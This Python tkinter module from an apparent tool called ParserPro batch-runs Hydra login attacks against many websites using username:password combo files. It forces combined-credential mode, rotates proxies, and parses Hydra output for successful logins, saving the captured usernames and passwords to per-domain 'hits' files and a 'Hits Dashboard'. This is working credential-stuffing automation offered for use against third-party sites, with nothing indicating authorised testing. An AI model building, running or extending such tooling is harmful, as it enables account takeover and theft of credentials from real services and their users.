import os
import re
import subprocess
import threading
import time
from datetime import datetime
from pathlib import Path

import tkinter as tk
from tkinter import messagebox, ttk

from config import DATA_DIR, HITS_DIR, LOGS_DIR, build_wsl_command, config, ensure_hydra_available
from helpers import get_site_filename, log_once


class RunnerMixin:
    HIT_RE = re.compile(r"login:\s*(?P<username>\S+)\s+password:\s*(?P<password>\S+)", re.IGNORECASE)

    def _append_hydra_log_threadsafe(self, text):
        self.ui_queue.put(("hydra_log", text))

    def build_runner_tab(self, tab):
        tab.columnconfigure(0, weight=1)
        tab.rowconfigure(0, weight=1)

        frame = ttk.Frame(tab, padding=12)
        frame.grid(row=0, column=0, sticky="nsew")
        frame.columnconfigure(0, weight=1)
        frame.rowconfigure(2, weight=1)

        ttk.Label(frame, text="Command Runner - Execute saved command templates", style="Header.TLabel").grid(row=0, column=0, sticky="w", pady=(0, 8))

        filter_frame = ttk.LabelFrame(frame, text="Filters")
        filter_frame.grid(row=1, column=0, sticky="ew", pady=(0, 8))
        for idx in range(9):
            filter_frame.columnconfigure(idx, weight=1 if idx in {1, 3, 5, 7} else 0)

        self.min_combos_var = tk.StringVar(value="0")
        self.min_hits_var = tk.StringVar(value="0")
        self.status_filter_var = tk.StringVar(value="All")
        self.last_run_filter_var = tk.StringVar(value="All")

        ttk.Label(filter_frame, text="Min combos").grid(row=0, column=0, padx=4, pady=4, sticky="w")
        ttk.Spinbox(filter_frame, from_=0, to=99999999, increment=1, textvariable=self.min_combos_var, width=10).grid(row=0, column=1, padx=4, pady=4, sticky="ew")
        ttk.Label(filter_frame, text="Status").grid(row=0, column=2, padx=4, pady=4, sticky="w")
        ttk.Combobox(filter_frame, textvariable=self.status_filter_var, values=["All", "Pending", "Running", "Failed", "Success"], state="readonly", width=12).grid(row=0, column=3, padx=4, pady=4, sticky="ew")
        ttk.Label(filter_frame, text="Min hits").grid(row=0, column=4, padx=4, pady=4, sticky="w")
        ttk.Spinbox(filter_frame, from_=0, to=99999999, increment=1, textvariable=self.min_hits_var, width=10).grid(row=0, column=5, padx=4, pady=4, sticky="ew")
        ttk.Label(filter_frame, text="Last run").grid(row=0, column=6, padx=4, pady=4, sticky="w")
        ttk.Combobox(filter_frame, textvariable=self.last_run_filter_var, values=["All", "Never Run", "Has Run"], state="readonly", width=12).grid(row=0, column=7, padx=4, pady=4, sticky="ew")
        ttk.Button(filter_frame, text="Apply", command=self.apply_runner_filters_and_sort).grid(row=0, column=8, padx=4, pady=4)

        paned = ttk.Panedwindow(frame, orient=tk.VERTICAL)
        paned.grid(row=2, column=0, sticky="nsew")

        table_section = ttk.LabelFrame(paned, text="Runner Results")
        table_section.columnconfigure(0, weight=1)
        table_section.rowconfigure(0, weight=1)

        columns = ("Select", "Site", "Combos", "Status", "Hits", "Last Run")
        self.runner_tree = ttk.Treeview(table_section, columns=columns, show="headings", height=15)
        for col in columns:
            self.runner_tree.heading(col, text=col, command=lambda c=col: self.on_runner_heading_click(c))
            width = 80 if col == "Select" else 180
            self.runner_tree.column(col, width=width, anchor="center" if col == "Select" else "w")
        self.runner_tree.grid(row=0, column=0, sticky="nsew")
        self.runner_tree.bind("<Button-1>", self.on_tree_click, add="+")

        tree_y = ttk.Scrollbar(table_section, orient="vertical", command=self.runner_tree.yview)
        tree_y.grid(row=0, column=1, sticky="ns")
        tree_x = ttk.Scrollbar(table_section, orient="horizontal", command=self.runner_tree.xview)
        tree_x.grid(row=1, column=0, sticky="ew")
        self.runner_tree.configure(yscrollcommand=tree_y.set, xscrollcommand=tree_x.set)
        self._bind_scroll_wheel(self.runner_tree)

        bottom_nb = ttk.Notebook(paned)

        log_section = ttk.Frame(bottom_nb)
        log_section.columnconfigure(0, weight=1)
        log_section.rowconfigure(1, weight=1)

        btn_frame = ttk.Frame(log_section)
        btn_frame.grid(row=0, column=0, sticky="ew", pady=(0, 8))
        ttk.Button(btn_frame, text="Refresh List", command=self.refresh_runner_list).pack(side="left", padx=4)
        self.run_selected_button = ttk.Button(btn_frame, text="Run Selected", command=self.run_selected_hydra)
        self.run_selected_button.pack(side="left", padx=4)
        self.run_all_button = ttk.Button(btn_frame, text="Run All (Filtered)", command=self.run_all_hydra)
        self.run_all_button.pack(side="left", padx=4)
        ttk.Button(btn_frame, text="Select All (Filtered)", command=self.select_all_filtered).pack(side="left", padx=4)
        ttk.Button(btn_frame, text="Deselect All (Filtered)", command=self.deselect_all_filtered).pack(side="left", padx=4)
        ttk.Button(btn_frame, text="Invert Selection (Filtered)", command=self.invert_selection_filtered).pack(side="left", padx=4)
        ttk.Button(btn_frame, text="Pause/Resume", command=self.toggle_pause).pack(side="right", padx=4)
        ttk.Button(btn_frame, text="Cancel", command=self.cancel_pipeline).pack(side="right", padx=(16, 4))

        self.hydra_log = tk.Text(log_section, height=12, wrap="none", font=("Consolas", 10), padx=8, pady=8)
        self.hydra_log.grid(row=1, column=0, sticky="nsew")
        log_y = ttk.Scrollbar(log_section, orient="vertical", command=self.hydra_log.yview)
        log_y.grid(row=1, column=1, sticky="ns")
        log_x = ttk.Scrollbar(log_section, orient="horizontal", command=self.hydra_log.xview)
        log_x.grid(row=2, column=0, sticky="ew")
        self.hydra_log.configure(yscrollcommand=log_y.set, xscrollcommand=log_x.set)
        self._bind_scroll_wheel(self.hydra_log)

        if not config.get("runner_enabled", True):
            self.run_selected_button.config(state="disabled")
            self.run_all_button.config(state="disabled")
            ttk.Label(
                log_section,
                text=config.get("hydra_unavailable_message", "Hydra unavailable."),
                foreground="#f39c12",
            ).grid(row=3, column=0, sticky="w", pady=(6, 0))

        hits_section = ttk.Frame(bottom_nb)
        hits_section.columnconfigure(0, weight=1)
        hits_section.rowconfigure(0, weight=1)
        hits_cols = ("Domain", "Username", "Password", "Timestamp")
        self.hits_tree = ttk.Treeview(hits_section, columns=hits_cols, show="headings", height=12)
        for col in hits_cols:
            self.hits_tree.heading(col, text=col)
            self.hits_tree.column(col, width=180, anchor="w")
        self.hits_tree.grid(row=0, column=0, sticky="nsew")
        hits_y = ttk.Scrollbar(hits_section, orient="vertical", command=self.hits_tree.yview)
        hits_y.grid(row=0, column=1, sticky="ns")
        self.hits_tree.configure(yscrollcommand=hits_y.set)

        bottom_nb.add(log_section, text="Runner Log")
        bottom_nb.add(hits_section, text="Hits Dashboard")

        paned.add(table_section, weight=3)
        paned.add(bottom_nb, weight=2)

        for var in (self.min_combos_var, self.min_hits_var, self.status_filter_var, self.last_run_filter_var):
            var.trace_add("write", lambda *_: self.apply_runner_filters_and_sort())

    def _coerce_int(self, value):
        try:
            return int(str(value).strip())
        except Exception:
            return 0

    def _normalize_status(self, data):
        status = str(data.get("status", "")).strip().lower()
        if status in {"fetch_failed", "dns_failed", "tls_failed", "proxy_failed", "conn_closed"}:
            return "Failed"
        if status in {"pending", "running", "failed", "success"}:
            return status.capitalize()
        return "Success" if data.get("form_found", False) else "Pending"

    def _row_last_run(self, data):
        val = data.get("last_processed")
        return val if val else "Never"

    def refresh_runner_list(self):
        selected_map = {row.get("site"): row.get("selected", False) for row in self.runner_rows_all}
        rows = []
        for base, data in self.processed_data.items():
            hits_file = HITS_DIR / f"{base.replace(':', '_')}.txt"
            hits_count = len(hits_file.read_text(encoding="utf-8").splitlines()) if hits_file.exists() else 0
            rows.append({
                "site": base,
                "combos": self._coerce_int(data.get("combo_count", 0)),
                "status": self._normalize_status(data),
                "hits": hits_count,
                "last_run": self._row_last_run(data),
                "last_run_ts": self._parse_timestamp(self._row_last_run(data)),
                "selected": selected_map.get(base, False),
            })

        self.runner_rows_all = rows
        self.apply_runner_filters_and_sort()
        self._write_log_threadsafe(f"Runner list refreshed: {len(self.runner_rows_all)} sites loaded")

    def _parse_timestamp(self, value):
        if not value or value == "Never":
            return 0
        try:
            from datetime import datetime
            return datetime.fromisoformat(value).timestamp()
        except Exception:
            return 0

    def apply_runner_filters_and_sort(self):
        min_combos = self._coerce_int(self.min_combos_var.get())
        min_hits = self._coerce_int(self.min_hits_var.get())
        status_filter = self.status_filter_var.get().strip().lower()
        last_run_filter = self.last_run_filter_var.get().strip().lower()

        filtered = []
        for row in self.runner_rows_all:
            if row.get("combos", 0) < min_combos:
                continue
            if row.get("hits", 0) < min_hits:
                continue
            if status_filter and status_filter != "all" and row.get("status", "").lower() != status_filter:
                continue
            if last_run_filter == "never run" and row.get("last_run") != "Never":
                continue
            if last_run_filter == "has run" and row.get("last_run") == "Never":
                continue
            filtered.append(row)

        self.runner_rows_view = filtered
        if hasattr(self, "request_autosave"):
            self.request_autosave()
        if self.runner_last_sort_col:
            reverse = self.runner_sort_state.get(self.runner_last_sort_col, False)
            self.sort_treeview(self.runner_last_sort_col, reverse)
        else:
            self._repopulate_runner_tree()

    def _sort_key(self, row, col_key):
        if col_key in {"Combos", "Hits"}:
            return self._coerce_int(row.get(col_key.lower(), 0))
        if col_key == "Last Run":
            return row.get("last_run_ts", 0)
        if col_key == "Select":
            return 1 if row.get("selected") else 0
        return str(row.get(col_key.lower().replace(" ", "_"), "")).lower()

    def sort_treeview(self, col_key, reverse):
        self.runner_rows_view.sort(key=lambda row: self._sort_key(row, col_key), reverse=reverse)
        self._repopulate_runner_tree()

    def on_runner_heading_click(self, col_key):
        current = self.runner_sort_state.get(col_key)
        if current is None:
            reverse = col_key in {"Combos", "Hits", "Last Run"}
        else:
            reverse = not current
        self.runner_sort_state[col_key] = reverse
        self.runner_last_sort_col = col_key
        self.sort_treeview(col_key, reverse)

    def _repopulate_runner_tree(self):
        yview = self.runner_tree.yview()
        self.runner_tree.delete(*self.runner_tree.get_children())
        for row in self.runner_rows_view:
            self.runner_tree.insert("", "end", iid=row["site"], values=(
                "[x]" if row.get("selected") else "[ ]",
                row.get("site"),
                row.get("combos", 0),
                row.get("status", "Pending"),
                row.get("hits", 0),
                row.get("last_run", "Never"),
            ))
        if yview:
            self.runner_tree.yview_moveto(yview[0])

    def on_tree_click(self, event):
        region = self.runner_tree.identify("region", event.x, event.y)
        if region != "cell":
            return
        col = self.runner_tree.identify_column(event.x)
        if col != "#1":
            return
        item_id = self.runner_tree.identify_row(event.y)
        if not item_id:
            return
        for row in self.runner_rows_all:
            if row.get("site") == item_id:
                row["selected"] = not row.get("selected", False)
                break
        self.apply_runner_filters_and_sort()

    def select_all_filtered(self):
        filtered_sites = {row["site"] for row in self.runner_rows_view}
        for row in self.runner_rows_all:
            if row["site"] in filtered_sites:
                row["selected"] = True
        self.apply_runner_filters_and_sort()

    def deselect_all_filtered(self):
        filtered_sites = {row["site"] for row in self.runner_rows_view}
        for row in self.runner_rows_all:
            if row["site"] in filtered_sites:
                row["selected"] = False
        self.apply_runner_filters_and_sort()

    def invert_selection_filtered(self):
        filtered_sites = {row["site"] for row in self.runner_rows_view}
        for row in self.runner_rows_all:
            if row["site"] in filtered_sites:
                row["selected"] = not row.get("selected", False)
        self.apply_runner_filters_and_sort()

    def _get_selected_sites(self):
        return [row["site"] for row in self.runner_rows_all if row.get("selected")]

    def run_selected_hydra(self):
        if not config.get("runner_enabled", True):
            messagebox.showwarning("Hydra Runner Disabled", config.get("hydra_unavailable_message", "Hydra is unavailable."))
            return
        selected = self._get_selected_sites()
        if not selected:
            messagebox.showinfo("No Selection", "Select at least one row using the checkbox column.")
            return
        self.start_runner_execution(selected)

    def run_all_hydra(self):
        if not config.get("runner_enabled", True):
            messagebox.showwarning("Hydra Runner Disabled", config.get("hydra_unavailable_message", "Hydra is unavailable."))
            return
        if not self.runner_rows_view:
            messagebox.showinfo("No Sites", "No filtered sites available.")
            return
        self.select_all_filtered()
        self.start_runner_execution([row["site"] for row in self.runner_rows_view if row.get("selected")])


    # NEW: Hydra auto-setup
    def _hydra_backend_for_runtime(self):
        """Return runtime hydra mode and optional WSL distro set during startup checks."""
        startup_mode = os.environ.get("PARSERPRO_HYDRA_MODE", "").strip().lower()
        startup_distro = os.environ.get("PARSERPRO_WSL_DISTRO", "").strip() or str(config.get("wsl_hydra_distro", "")).strip()
        if startup_mode in {"wsl", "native"}:
            return {"mode": startup_mode, "distro": startup_distro}

        prefer_wsl = bool(config.get("prefer_wsl_hydra", True))
        status = ensure_hydra_available(log_func=self._write_log_threadsafe)
        if not status.get("available"):
            self.ui_queue.put(("critical_error", f"Hydra is not available: {status.get('message')}."))
            return None
        mode = status.get("mode") or "native"
        if prefer_wsl and mode == "wsl":
            return {"mode": "wsl", "distro": startup_distro}
        return {"mode": mode, "distro": startup_distro}

    def _terminate_process_tree(self, process, reason):
        """Terminate process gracefully, escalating to kill if needed."""
        if not process or process.poll() is not None:
            return
        self._append_hydra_log_threadsafe(f"[INFO] Stopping Hydra process ({reason})\n")
        try:
            process.terminate()
            process.wait(timeout=5)
        except Exception:
            try:
                time.sleep(1)
                process.kill()
            except Exception:
                pass

    def start_runner_execution(self, sites):
        if self.runner_running:
            messagebox.showinfo("Runner Busy", "Runner is already active.")
            return
        self.runner_running = True
        self.cancel_event.clear()
        self.pause_event.clear()
        self.pause_button.config(state="normal", text="Pause")
        self.cancel_button.config(state="normal")
        self.status_text.set(f"Runner active ({len(sites)} queued)")
        self.state_text.set("Running")
        for row in self.runner_rows_all:
            if row["site"] in set(sites):
                row["status"] = "Running"
        self.apply_runner_filters_and_sort()

        self._write_log_threadsafe(f"Starting command runner on {len(sites)} selected sites...")
        self.runner_thread = threading.Thread(target=self.execute_hydra, args=(sites,), daemon=True)
        self.runner_thread.start()

    def execute_hydra(self, sites):
        if not config.get("runner_enabled", True):
            self._append_hydra_log_threadsafe("Runner is disabled in config (runner_enabled=false).\n")
            self.ui_queue.put(("runner_done", "Runner disabled in config."))
            return

        session_ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        runner_log_file = LOGS_DIR / f"runner_{session_ts}.log"
        hydra_backend = self._hydra_backend_for_runtime()
        if not hydra_backend:
            self.ui_queue.put(("runner_done", config.get("hydra_unavailable_message", "Runner stopped: Hydra unavailable.")))
            return
        backend_mode = hydra_backend.get("mode", "native")
        backend_distro = hydra_backend.get("distro", "")
        timeout_seconds = int(config.get("hydra_timeout_seconds", 3600))
        for site in sites:
            if self.cancel_event.is_set():
                self._append_hydra_log_threadsafe("Runner cancelled by user.\n")
                break
            while self.pause_event.is_set() and not self.cancel_event.is_set():
                time.sleep(0.2)

            cmd_template = self.processed_data.get(site, {}).get("hydra_command_template")
            if not cmd_template:
                self._append_hydra_log_threadsafe(f"No command template for {site}; skipping.\n")
                self._set_row_status(site, "Failed")
                continue

            combo_file_path = self._resolve_combo_file_path(site)
            if not combo_file_path.exists():
                self._append_hydra_log_threadsafe(f"[ERROR] Combo file missing for {site}: {combo_file_path}\n")
                self._set_row_status(site, "Failed")
                continue

            combo_file = str(combo_file_path.resolve())

            # FIXED: Force Hydra combined-credential mode and replace all supported combo placeholders.
            cmd = str(cmd_template)
            cmd = cmd.replace("{{combo_file}}", combo_file)
            cmd = cmd.replace("{combo_file}", combo_file)
            cmd = cmd.replace(" -L ", " -C ").replace(" -P ", " ")

            # FIXED: Defensive guard for unresolved placeholder variants.
            if "{{combo_file}}" in cmd or "{combo_file}" in cmd:
                self._append_hydra_log_threadsafe(
                    f"[WARN] Combo placeholder unresolved for {site}; skipping command: {cmd}\n"
                )
                self._set_row_status(site, "Failed")
                continue
            intercept_proxy = ""
            if bool(config.get("use_burp", False)):
                intercept_proxy = config.get("burp_proxy", "").strip()
            elif bool(config.get("use_zap", False)):
                intercept_proxy = config.get("zap_proxy", "").strip()
            if intercept_proxy and " -p " not in f" {cmd} ":
                cmd = f"{cmd} -p {intercept_proxy}"
            if bool(config.get("proxy_rotation", False)) and config.get("proxy_list_file", "").strip():
                from proxies import ProxyManager

                pm = ProxyManager(config.get("proxy_list_file", "").strip())
                rotate_proxy = pm.get_proxy()
                if rotate_proxy and " -p " not in f" {cmd} ":
                    cmd = f"{cmd} -p {rotate_proxy['server']}"

            self._append_hydra_log_threadsafe(f"\n=== Starting command for {site} ===\n")
            if str(config.get("wsl_hydra_distro", "")).strip():
                # FIXED: Hydra detection / PATH add / WSL Kali support
                self._append_hydra_log_threadsafe(f"[Using WSL {config.get('wsl_hydra_distro')}] {cmd}\n")
            else:
                self._append_hydra_log_threadsafe(f"Command: {cmd}\n")
            # FIXED: Log the final command after all replacements for debugging/auditing.
            self._append_hydra_log_threadsafe(f"[DEBUG FINAL CMD] {cmd}\n")
            print(f"[runner-debug] final hydra command for {site}: {cmd}")

            try:
                if backend_mode == "wsl":
                    wsl_user = str(config.get("wsl_username", "")).strip()
                    distro = str(config.get("wsl_hydra_distro", "")).strip() or backend_distro
                    wsl_cmd = build_wsl_command(cmd, distro=distro, username=wsl_user)
                    self._append_hydra_log_threadsafe(f"[Using WSL {distro}] wsl -d {distro} {cmd}\n")
                    process = subprocess.Popen(
                        wsl_cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        text=True,
                        encoding="utf-8",
                        errors="replace",
                        bufsize=1,
                    )
                else:
                    process = subprocess.Popen(
                        cmd,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        text=True,
                        encoding="utf-8",
                        errors="replace",
                        bufsize=1,
                    )

                self.runner_active_process = process
                self.register_running_process(process)
                for line in iter(process.stdout.readline, ""):
                    self._append_hydra_log_threadsafe(line)
                    with runner_log_file.open("a", encoding="utf-8") as lf:
                        lf.write(line)
                    if self.cancel_event.is_set():
                        self._terminate_process_tree(process, "user_cancel")
                        break
                    self._capture_hit(site, line)

                try:
                    process.wait(timeout=timeout_seconds)
                except subprocess.TimeoutExpired:
                    self._append_hydra_log_threadsafe(f"[WARN] Timeout reached ({timeout_seconds}s) for {site}; terminating process.\n")
                    self._terminate_process_tree(process, "timeout")
                if process.returncode == 0 and not self.cancel_event.is_set():
                    self._append_hydra_log_threadsafe(f"[SUCCESS] Command finished for {site}\n")
                    self._set_row_status(site, "Success")
                elif self.cancel_event.is_set():
                    self._set_row_status(site, "Pending")
                else:
                    self._append_hydra_log_threadsafe(f"[ERROR] Command exited with code {process.returncode} for {site}\n")
                    self._set_row_status(site, "Failed")
            except Exception as e:
                self._append_hydra_log_threadsafe(f"Error running command for {site}: {e}\n")
                self._set_row_status(site, "Failed")
            finally:
                self.unregister_running_process(process if "process" in locals() else None)
                self.runner_active_process = None

            self._append_hydra_log_threadsafe(f"=== Finished {site} ===\n\n")

        msg = "Runner cancelled." if self.cancel_event.is_set() else "Runner complete."
        self.ui_queue.put(("runner_done", msg))

    def _resolve_combo_file_path(self, site):
        site_data = self.processed_data.get(site, {}) if isinstance(self.processed_data, dict) else {}
        configured_combo_path = str(site_data.get("combo_path", "")).strip()
        if configured_combo_path:
            configured_path = Path(configured_combo_path)
            if configured_path.exists():
                return configured_path

        combo_file = get_site_filename(site)
        data_combo = DATA_DIR / combo_file
        if data_combo.exists():
            return data_combo

        return Path(combo_file)

    def _set_row_status(self, site, status):
        for row in self.runner_rows_all:
            if row["site"] == site:
                row["status"] = status
                break
        self.ui_queue.put(("runner_refresh", None))

    def _capture_hit(self, site, line):
        if "[DATA]" not in line or "password" not in line.lower():
            return
        stamp = datetime.now().isoformat(timespec="seconds")
        match = self.HIT_RE.search(line)
        username = match.group("username") if match else "unknown"
        password = match.group("password") if match else "unknown"
        hit_line = f"{stamp} {username}:{password}"

        legacy_file = DATA_DIR / f"hits_{site.replace('.', '_')}.txt"
        with legacy_file.open("a", encoding="utf-8") as hf:
            hf.write(line.strip() + "\n")

        domain_file = HITS_DIR / f"{site.replace(':', '_')}.txt"
        with domain_file.open("a", encoding="utf-8") as hf:
            hf.write(hit_line + "\n")

        self.ui_queue.put(("runner_hit", {"domain": site, "username": username, "password": password, "timestamp": stamp}))

    def terminate_active_runner_process(self):
        proc = self.runner_active_process
        if not proc or proc.poll() is not None:
            return
        self._terminate_process_tree(proc, "cancel request")
        log_once("runner-process-stop", "Active runner subprocess terminated after cancel request.")

    def finish_runner_execution(self, final_msg):
        self.runner_running = False
        self.pause_event.clear()
        self.cancel_event.clear()
        self.pause_button.config(state="disabled", text="Pause")
        self.cancel_button.config(state="disabled")
        self.status_text.set(final_msg)
        self.state_text.set("Idle")
        self.apply_runner_filters_and_sort()
        self.refresh_runner_list()
        self._write_log_threadsafe(final_msg)
